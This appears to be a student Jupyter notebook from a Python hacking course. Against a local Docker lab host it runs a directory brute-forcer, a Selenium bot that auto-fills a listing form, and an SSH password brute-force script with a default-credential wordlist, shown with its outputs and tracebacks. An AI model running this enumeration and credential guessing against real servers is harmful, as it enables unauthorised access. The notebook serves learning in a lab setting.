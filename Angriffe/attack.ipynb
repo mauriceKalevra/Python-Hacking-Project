{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import queue\n",
    "import threading\n",
    "import os\n",
    "import requests\n",
    "from urllib.request import urlopen, Request\n",
    "from urllib.error import HTTPError\n",
    "from bs4 import BeautifulSoup\n",
    "import wget\n",
    "from urllib import request\n",
    "import urllib.request, urllib.error, urllib.parse\n",
    "import re\n",
    "from selenium import webdriver\n",
    "from selenium.webdriver.chrome.service import Service\n",
    "import time\n",
    "from selenium.webdriver.common.by import By\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "class MySpider():\n",
    "    def __init__(self):\n",
    "        pass\n",
    "        \n",
    "    def mygobuster(self,target):\n",
    "        wordlist = [a.strip() for a in open(\"wordlist.txt\")]\n",
    "        filters = [\".html\",\".css\",\"jpg\", \"\",\".js\",\".md\",\".png\"]\n",
    "        html = open(\"html.txt\", \"a+\") \n",
    "        for word in wordlist:\n",
    "            for f in filters:\n",
    "                url = target+word+f\n",
    "                re = requests.head(url)\n",
    "\n",
    "                if re.status_code==301 or re.status_code==401:\n",
    "                    print(\"Directory found: \", re.url, re.status_code)\n",
    "                    newurl = re.url+\"/\"\n",
    "                    \n",
    "                    self.mygobuster(newurl)\n",
    "\n",
    "                elif re.status_code==200:\n",
    "                    print(\"Found: \", re.url, re.status_code)\n",
    "                    response = urllib.request.urlopen(url)\n",
    "                    if \".html\" in re.url:\n",
    "                        html.write(re.url+\"\\n\")\n",
    "                    try:\n",
    "                        Content = response.read().decode('utf-8')\n",
    "                        f = open(\"found/\"+str(re.url).replace(\"/\",\"\"), 'w+')\n",
    "                        f.write(Content)\n",
    "                        f.close()\n",
    "                    except:\n",
    "                        Content = response.read()\n",
    "                        f = open(\"found/\"+str(re.url).replace(\"/\",\"\"), 'wb+')\n",
    "                        f.write(Content)\n",
    "                        f.close()\n",
    "                else:\n",
    "                    continue\n",
    "\n",
    "    def CSSbuster(self, target):\n",
    "        r  = requests.get(\" http://172.17.0.2:1337/stylesheet.css\")\n",
    "        data = r.text\n",
    "        l = []\n",
    "        for i in re.findall('url\\(([^)]+)\\)',data):\n",
    "            l.append(i)\n",
    "        s = [x[2:].strip('\"\"') for x in l[:2]]\n",
    "        for j in s:\n",
    "            response = urllib.request.urlopen(target+j)\n",
    "            if response.code==200:\n",
    "                print(\"Picture found:\", target+j)\n",
    "                con = response.read()\n",
    "                f = open(\"found/\"+str(response.url).replace(\"/\",\"\"), 'wb+')\n",
    "                f.write(con)\n",
    "            else:\n",
    "                pass\n",
    "    \n",
    "    \n",
    "    def myBot(self):\n",
    "        \n",
    "        s=Service('/home/sleven/Studium/Sem5/Hacking-mit-Python/geckodriver')\n",
    "        browser = webdriver.Firefox(service=s)\n",
    "        for url in open(\"html.txt\"):\n",
    "            if url==\"http://172.17.0.2:1337/biete.html\\n\":\n",
    "                browser.get(url)\n",
    "                eingabe = browser.find_element(By.ID,\"ort\")\n",
    "                eingabe.send_keys(\"Salzburg\")\n",
    "                time.sleep(1)\n",
    "                eingabe2 = browser.find_element(By.ID,\"preis\")\n",
    "                eingabe2.send_keys(\"1500\")\n",
    "                time.sleep(1)\n",
    "                eingabe2 = browser.find_element(By.ID,\"zimmer\")\n",
    "                eingabe2.send_keys(\"5\")\n",
    "                time.sleep(1)\n",
    "                eingabe3 = browser.find_element(By.ID,\"flaeche\")\n",
    "                eingabe3.send_keys(\"500\")\n",
    "                time.sleep(1)\n",
    "                eingabe4 = browser.find_element(By.ID,\"kontakt\")\n",
    "                eingabe4.send_keys(\"Mori.r@web.de\")\n",
    "                time.sleep(1)\n",
    "\n",
    "                ein = browser.find_element(By.ID,\"saveimmoButton\")\n",
    "                ein.click()\n",
    "                time.sleep(1)\n",
    "            browser.get(url)\n",
    "            time.sleep(1)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Directory found:  http://172.17.0.2:1337/data 301\n",
      "Directory found:  http://172.17.0.2:1337/data/about 301\n",
      "Found:  http://172.17.0.2:1337/data/about/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/faq 301\n",
      "Found:  http://172.17.0.2:1337/data/faq/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/impressum 301\n",
      "Found:  http://172.17.0.2:1337/data/impressum/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/datenschutz 301\n",
      "Found:  http://172.17.0.2:1337/data/datenschutz/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/about 301\n",
      "Found:  http://172.17.0.2:1337/data/about/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/impressum 301\n",
      "Found:  http://172.17.0.2:1337/data/impressum/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/img 301\n",
      "Directory found:  http://172.17.0.2:1337/img/background-images 301\n",
      "Found:  http://172.17.0.2:1337/about.html 200\n",
      "Found:  http://172.17.0.2:1337/index.html 200\n",
      "Found:  http://172.17.0.2:1337/biete.html 200\n",
      "Found:  http://172.17.0.2:1337/biete 200\n",
      "Found:  http://172.17.0.2:1337/angebote.html 200\n",
      "Found:  http://172.17.0.2:1337/faq.html 200\n",
      "Directory found:  http://172.17.0.2:1337/js 301\n",
      "Found:  http://172.17.0.2:1337/js/slideshow.js 200\n",
      "Directory found:  http://172.17.0.2:1337/static 301\n",
      "Directory found:  http://172.17.0.2:1337/static/js 301\n",
      "Directory found:  http://172.17.0.2:1337/static/css 301\n",
      "Found:  http://172.17.0.2:1337/static/css/bootstrap-grid.css 200\n",
      "Directory found:  http://172.17.0.2:1337/static/bootstrap-4.0.0 301\n",
      "Found:  http://172.17.0.2:1337/static/bootstrap-4.0.0/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/static/bootstrap-4.0.0/js 301\n",
      "Found:  http://172.17.0.2:1337/static/bootstrap-4.0.0/README.md 200\n",
      "Found:  http://172.17.0.2:1337/stylesheet.css 200\n",
      "Found:  http://172.17.0.2:1337/impressum.html 200\n",
      "Found:  http://172.17.0.2:1337/datenschutz.html 200\n",
      "Found:  http://172.17.0.2:1337/angebote.html 200\n",
      "Found:  http://172.17.0.2:1337/myangebote.html 200\n",
      "Found:  http://172.17.0.2:1337/suche.html 200\n",
      "Found:  http://172.17.0.2:1337/script.js 200\n",
      "Found:  http://172.17.0.2:1337/README.md 200\n",
      "Found:  http://172.17.0.2:1337/placeholder.png 200\n",
      "Directory found:  http://172.17.0.2:1337/favicon_io 301\n",
      "Found:  http://172.17.0.2:1337/about.html 200\n",
      "Found:  http://172.17.0.2:1337/impressum.html 200\n",
      "Picture found: http://172.17.0.2:1337/data/bgscreen.png\n",
      "Picture found: http://172.17.0.2:1337/data/pexels-pixabay-273209.jpg\n"
     ]
    }
   ],
   "source": [
    "S = MySpider()\n",
    "S.mygobuster(\"http://172.17.0.2:1337/\")\n",
    "S.CSSbuster(\"http://172.17.0.2:1337/\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Selenium**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.chrome.service import Service\n",
    "import time\n",
    "from selenium.webdriver.common.by import By"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "s=Service('/home/sleven/Studium/Sem5/Hacking-mit-Python/geckodriver')\n",
    "browser = webdriver.Firefox(service=s)\n",
    "url = 'http://172.17.0.2:1337/biete.html'\n",
    "#driver = webdriver.Firefox(executable_path=\"/home/sleven/Studium/Sem5/Hacking-mit-Python/geckodriver\")\n",
    "browser.get(url)\n",
    "time.sleep(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "def myBot():\n",
    "    s=Service('/home/sleven/Studium/Sem5/Hacking-mit-Python/geckodriver')\n",
    "    browser = webdriver.Firefox(service=s)\n",
    "    for url in open(\"html.txt\"):\n",
    "        if url==\"http://172.17.0.2:1337/biete.html\\n\":\n",
    "            browser.get(url)\n",
    "            eingabe = browser.find_element(By.ID,\"ort\")\n",
    "            eingabe.send_keys(\"Salzburg\")\n",
    "            time.sleep(1)\n",
    "            eingabe2 = browser.find_element(By.ID,\"preis\")\n",
    "            eingabe2.send_keys(\"1500\")\n",
    "            time.sleep(1)\n",
    "            eingabe2 = browser.find_element(By.ID,\"zimmer\")\n",
    "            eingabe2.send_keys(\"5\")\n",
    "            time.sleep(1)\n",
    "            eingabe3 = browser.find_element(By.ID,\"flaeche\")\n",
    "            eingabe3.send_keys(\"500\")\n",
    "            time.sleep(1)\n",
    "            eingabe4 = browser.find_element(By.ID,\"kontakt\")\n",
    "            eingabe4.send_keys(\"Mori.r@web.de\")\n",
    "            time.sleep(1)\n",
    "\n",
    "            ein = browser.find_element(By.ID,\"saveimmoButton\")\n",
    "            ein.click()\n",
    "            time.sleep(1)\n",
    "        browser.get(url)\n",
    "        time.sleep(1)\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "myBot()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [],
   "source": [
    "import urllib3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**SSH Angriff**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "import paramiko\n",
    "from collections import deque"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "import paramiko\n",
    "from collections import deque\n",
    "import queue\n",
    "import sys\n",
    "import paramiko\n",
    "\n",
    "def attackssh(ip):\n",
    "    try:\n",
    "        global que\n",
    "        print(\"Attacking ssh.....\")\n",
    "        ssh = paramiko.SSHClient()\n",
    "        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "        if len(que)==0:\n",
    "            print(\"Not found, maybe try a new wordlist?!\")\n",
    "            return 1\n",
    "        for line in range(len(que)):\n",
    "            j = len(que)\n",
    "            for pair in range(j):\n",
    "                [username, password] = que[line].strip().split()\n",
    "                try:\n",
    "                    print(f\"Trying with {username} {password}\")\n",
    "                    que.popleft()\n",
    "                    conn = ssh.connect(ip, username=username,password=password)\n",
    "                    if conn is None:\n",
    "                        print(f\"Successfully Authenticated with {username} {password}\")\n",
    "                        print(que)\n",
    "                        break\n",
    "                except paramiko.AuthenticationException:\n",
    "                    print(\"Failed!\")\n",
    "                    continue\n",
    "    except NameError:\n",
    "        print(\"I was here\")\n",
    "        que = deque()\n",
    "        for i in open(\"sshwordlist.txt\", \"r\").readlines():\n",
    "            que.append(i)\n",
    "        attackssh(\"172.17.0.2\")        \n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attacking ssh.....\n",
      "I was here\n",
      "Attacking ssh.....\n",
      "Trying with admin password\n",
      "Failed!\n",
      "Trying with root toor\n",
      "Failed!\n",
      "Trying with admin admin\n",
      "Failed!\n",
      "Trying with server admin\n",
      "Failed!\n",
      "Trying with sinus cosinus\n",
      "Failed!\n",
      "Trying with tangens riebert\n",
      "Failed!\n",
      "Trying with supp woritz\n",
      "Failed!\n",
      "Trying with win noch\n",
      "Failed!\n",
      "Trying with wier und\n",
      "Failed!\n",
      "Trying with wolle wunktion\n",
      "Failed!\n",
      "Trying with admin password\n",
      "Failed!\n",
      "Trying with root toor\n",
      "Failed!\n",
      "Trying with admin admin\n",
      "Failed!\n",
      "Trying with server admin\n",
      "Failed!\n",
      "Trying with sinus cosinus\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Exception (client): Error reading SSH protocol banner\n",
      "Traceback (most recent call last):\n",
      "  File \"/home/sleven/anaconda3/lib/python3.7/site-packages/paramiko/transport.py\", line 2278, in _check_banner\n",
      "    buf = self.packetizer.readline(timeout)\n",
      "  File \"/home/sleven/anaconda3/lib/python3.7/site-packages/paramiko/packet.py\", line 380, in readline\n",
      "    buf += self._read_timeout(timeout)\n",
      "  File \"/home/sleven/anaconda3/lib/python3.7/site-packages/paramiko/packet.py\", line 609, in _read_timeout\n",
      "    raise EOFError()\n",
      "EOFError\n",
      "\n",
      "During handling of the above exception, another exception occurred:\n",
      "\n",
      "Traceback (most recent call last):\n",
      "  File \"/home/sleven/anaconda3/lib/python3.7/site-packages/paramiko/transport.py\", line 2101, in run\n",
      "    self._check_banner()\n",
      "  File \"/home/sleven/anaconda3/lib/python3.7/site-packages/paramiko/transport.py\", line 2283, in _check_banner\n",
      "    \"Error reading SSH protocol banner\" + str(e)\n",
      "paramiko.ssh_exception.SSHException: Error reading SSH protocol banner\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Failed!\n",
      "Trying with tangens riebert\n"
     ]
    },
    {
     "ename": "SSHException",
     "evalue": "Error reading SSH protocol banner",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_104463/1384575829.py\u001b[0m in \u001b[0;36mattackssh\u001b[0;34m(ip)\u001b[0m\n\u001b[1;32m     13\u001b[0m         \u001b[0mssh\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mset_missing_host_key_policy\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mparamiko\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mAutoAddPolicy\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 14\u001b[0;31m         \u001b[0;32mif\u001b[0m \u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mque\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m==\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     15\u001b[0m             \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Not found, maybe try a new wordlist?!\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mNameError\u001b[0m: name 'que' is not defined",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mSSHException\u001b[0m                              Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_104463/1871042764.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mattackssh\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"172.17.0.2\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m/tmp/ipykernel_104463/1384575829.py\u001b[0m in \u001b[0;36mattackssh\u001b[0;34m(ip)\u001b[0m\n\u001b[1;32m     35\u001b[0m         \u001b[0;32mfor\u001b[0m \u001b[0mi\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mopen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"sshwordlist.txt\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"r\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreadlines\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     36\u001b[0m             \u001b[0mque\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mappend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mi\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 37\u001b[0;31m         \u001b[0mattackssh\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"172.17.0.2\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     38\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/tmp/ipykernel_104463/1384575829.py\u001b[0m in \u001b[0;36mattackssh\u001b[0;34m(ip)\u001b[0m\n\u001b[1;32m     22\u001b[0m                     \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mf\"Trying with {username} {password}\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     23\u001b[0m                     \u001b[0mque\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mpopleft\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 24\u001b[0;31m                     \u001b[0mconn\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mssh\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mconnect\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mip\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0musername\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0musername\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mpassword\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mpassword\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     25\u001b[0m                     \u001b[0;32mif\u001b[0m \u001b[0mconn\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     26\u001b[0m                         \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mf\"Successfully Authenticated with {username} {password}\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/anaconda3/lib/python3.7/site-packages/paramiko/client.py\u001b[0m in \u001b[0;36mconnect\u001b[0;34m(self, hostname, port, username, password, pkey, key_filename, timeout, allow_agent, look_for_keys, compress, sock, gss_auth, gss_kex, gss_deleg_creds, gss_host, banner_timeout, auth_timeout, gss_trust_dns, passphrase, disabled_algorithms)\u001b[0m\n\u001b[1;32m    404\u001b[0m             \u001b[0msec_opts\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mkey_types\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0mkeytype\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0mother_types\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    405\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 406\u001b[0;31m         \u001b[0mt\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstart_client\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtimeout\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mtimeout\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    407\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    408\u001b[0m         \u001b[0;31m# If GSS-API Key Exchange is performed we are not required to check the\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/anaconda3/lib/python3.7/site-packages/paramiko/transport.py\u001b[0m in \u001b[0;36mstart_client\u001b[0;34m(self, event, timeout)\u001b[0m\n\u001b[1;32m    704\u001b[0m                 \u001b[0me\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mget_exception\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    705\u001b[0m                 \u001b[0;32mif\u001b[0m \u001b[0me\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 706\u001b[0;31m                     \u001b[0;32mraise\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    707\u001b[0m                 \u001b[0;32mraise\u001b[0m \u001b[0mSSHException\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Negotiation failed.\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    708\u001b[0m             if event.is_set() or (\n",
      "\u001b[0;32m~/anaconda3/lib/python3.7/site-packages/paramiko/transport.py\u001b[0m in \u001b[0;36mrun\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m   2099\u001b[0m                     \u001b[0;34m\"Local version/idstring: {}\"\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mlocal_version\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2100\u001b[0m                 )  # noqa\n\u001b[0;32m-> 2101\u001b[0;31m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_check_banner\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2102\u001b[0m                 \u001b[0;31m# The above is actually very much part of the handshake, but\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2103\u001b[0m                 \u001b[0;31m# sometimes the banner can be read but the machine is not\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/anaconda3/lib/python3.7/site-packages/paramiko/transport.py\u001b[0m in \u001b[0;36m_check_banner\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m   2281\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mException\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2282\u001b[0m                 raise SSHException(\n\u001b[0;32m-> 2283\u001b[0;31m                     \u001b[0;34m\"Error reading SSH protocol banner\"\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0mstr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0me\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2284\u001b[0m                 )\n\u001b[1;32m   2285\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0mbuf\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;36m4\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0;34m\"SSH-\"\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mSSHException\u001b[0m: Error reading SSH protocol banner"
     ]
    }
   ],
   "source": [
    "\n",
    "attackssh(\"172.17.0.2\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "ename": "IndexError",
     "evalue": "pop from an empty deque",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mIndexError\u001b[0m                                Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_11912/3191675155.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mque\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mpop\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      2\u001b[0m \u001b[0mque\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mIndexError\u001b[0m: pop from an empty deque"
     ]
    }
   ],
   "source": [
    "que"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "admin password\r\n",
      "root toor\r\n",
      "admin admin\r\n",
      "root root\r\n"
     ]
    }
   ],
   "source": [
    "cat sshwordlist.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "from collections import deque"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "queue = []"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "module 'queue' has no attribute 'append'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_11912/2804229550.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mq\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mappend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mi\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m: module 'queue' has no attribute 'append'"
     ]
    }
   ],
   "source": [
    "queue.append()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = deque()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "s.append(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(s)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'd' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
